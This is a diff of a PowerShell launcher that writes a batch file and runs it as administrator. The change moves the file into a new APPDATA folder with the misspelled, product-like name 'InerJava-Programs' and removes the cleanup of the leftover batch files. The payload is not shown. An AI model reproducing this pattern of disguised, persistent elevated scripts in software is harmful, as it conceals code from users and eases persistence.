@@ -15,7 +15,12 @@ try {
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\bostr_$rand.bat" } else { "$env:TEMP\bostr_$rand.bat" }
+
+$AppDataPath = Join-Path -Path $env:APPDATA -ChildPath 'InerJava-Programs'
+if (-not (Test-Path -Path $AppDataPath)) {
+    New-Item -Path $AppDataPath -ItemType Directory | Out-Null
+}
+$FilePath = Join-Path -Path $AppDataPath -ChildPath "bostr_$rand.bat"
 
 $ScriptArgs = "$args "
 $prefix = "@::: $rand `r`n"
@@ -26,9 +31,3 @@ Set-Content -Path $FilePath -Value $content -Encoding UTF8
 
 # Start the batch file as an administrator
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`" $ScriptArgs" -Verb RunAs -Wait
-
-# Clean up temporary files
-$FilePaths = @("$env:TEMP\bostr*.bat", "$env:SystemRoot\Temp\bostr*.bat")
-foreach ($FilePath in $FilePaths) {
-    Get-Item $FilePath -ErrorAction SilentlyContinue | Remove-Item -ErrorAction SilentlyContinue
-}
